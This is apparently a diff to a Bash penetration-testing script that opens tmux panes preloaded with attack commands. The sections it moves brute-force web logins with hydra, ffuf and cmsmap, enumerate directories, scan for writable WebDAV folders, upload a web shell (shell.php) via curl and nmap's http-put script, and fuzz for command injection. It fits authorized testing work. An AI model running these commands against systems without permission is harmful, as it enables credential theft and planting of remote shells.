@@ -32,7 +32,7 @@ do
     echo "3. WEB Information Gathering: WAF detection, site structure, virtual host, etc"
     echo "4. Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc"
     echo "5. Service AuthN bypass: ssh, ftp, smtp,  etc (TBD)"
-    echo "6. WEB Service AuthN bypass: brute force, command injection, webDAV, etc"
+    echo "6. WEB Service AuthN bypass: brute force, command injection"
     read -p "Enter the number of the desired action (0 to exit): " choice
 
 
@@ -955,6 +955,34 @@ tmux send-keys -t PT:14.11 "droopescan scan drupal -u http://$site -t 32"
 cd $folderProject
 
 
+# WEB DAV
+cd $folderProjectQucikWin
+# Layout
+tmux new-window -t PT:15 -n 'from Site Structure -> WEB DAV'
+tmux split-window -v -t PT:15.0
+tmux split-window -v -t PT:15.1
+tmux split-window -v -t PT:15.2
+tmux split-window -v -t PT:15.3
+tmux select-pane -t "15.3"
+tmux split-window -h -t "15.3"
+tmux split-window -h -t "15.3"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:15.0 "# Bruteforce attack to get Target Site Folders" Enter
+tmux send-keys -t PT:15.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
+tmux send-keys -t PT:15.1 "# Bruteforce attack to get credentials to specific folder" Enter
+tmux send-keys -t PT:15.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
+tmux send-keys -t PT:15.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
+tmux send-keys -t PT:15.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
+tmux send-keys -t PT:15.3 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:15.3 "cadaver $ip"
+tmux send-keys -t PT:15.4 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:15.4 "curl -T shell.txt -u login:password http://$ip"
+tmux send-keys -t PT:15.5 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:15.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
+cd $folderProject
+
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
@@ -1041,55 +1069,6 @@ tmux send-keys -t PT:4.0 "sudo nikto -h http://$site"
 cd $folderProject
 
 
-# WEB Bruteforce AuthN
-cd $folderProjectQuickWin
-# Layout
-tmux new-window -t PT:5 -n 'WEB Bruteforce AuthN'
-tmux split-window -v -t PT:5.0
-tmux split-window -v -t PT:5.1
-tmux split-window -v -t PT:5.2
-tmux select-pane -t "5.1"
-tmux split-window -h -t "5.1"
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:5.0 "# find valid dictionary for bruteforce" Enter
-tmux send-keys -t PT:5.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
-tmux send-keys -t PT:5.1 "# bruteforce POST authN" Enter
-tmux send-keys -t PT:5.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
-tmux send-keys -t PT:5.2 "# bruteforce POST authN with BurpSuite saved request" Enter
-tmux send-keys -t PT:5.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
-tmux send-keys -t PT:5.3 "# bruteforce BasicAuth authN" Enter
-tmux send-keys -t PT:5.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
-tmux send-keys -t PT:5.4 "# bruteforce CMS" Enter
-tmux send-keys -t PT:5.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
-cd $folderProject
-
-
-# WEB DAV
-cd $folderProjectQucikWin
-# Layout
-tmux new-window -t PT:6 -n 'WEB DAV'
-tmux split-window -v -t PT:6.0
-tmux split-window -v -t PT:6.1
-tmux split-window -v -t PT:6.2
-tmux split-window -v -t PT:6.3
-tmux select-pane -t "6.3"
-tmux split-window -h -t "6.3"
-tmux split-window -h -t "6.3"
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:6.0 "# Bruteforce attack to get Target Site Folders" Enter
-tmux send-keys -t PT:6.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
-tmux send-keys -t PT:6.1 "# Bruteforce attack to get credentials to specific folder" Enter
-tmux send-keys -t PT:6.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
-tmux send-keys -t PT:6.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
-tmux send-keys -t PT:6.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
-tmux send-keys -t PT:6.3 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:6.3 "cadaver $ip"
-tmux send-keys -t PT:6.4 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:6.4 "curl -T shell.txt -u login:password http://$ip"
-tmux send-keys -t PT:6.5 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:6.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
-cd $folderProject
-
 
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
@@ -1156,6 +1135,31 @@ tmux send-keys -t PT:1.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"C
 tmux send-keys -t PT:1.5 "# command injection automation (POST)" Enter
 tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
 cd $folderProject
+
+
+
+# WEB Bruteforce AuthN
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
+tmux split-window -v -t PT:2.0
+tmux split-window -v -t PT:2.1
+tmux split-window -v -t PT:2.2
+tmux select-pane -t "2.1"
+tmux split-window -h -t "2.1"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:2.0 "# find valid dictionary for bruteforce" Enter
+tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
+tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
+tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
+tmux send-keys -t PT:2.2 "# bruteforce POST authN with BurpSuite saved request" Enter
+tmux send-keys -t PT:2.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
+tmux send-keys -t PT:2.3 "# bruteforce BasicAuth authN" Enter
+tmux send-keys -t PT:2.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
+tmux send-keys -t PT:2.4 "# bruteforce CMS" Enter
+tmux send-keys -t PT:2.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
+cd $folderProject
+
 
 
 # Attivazione della modalità interattiva
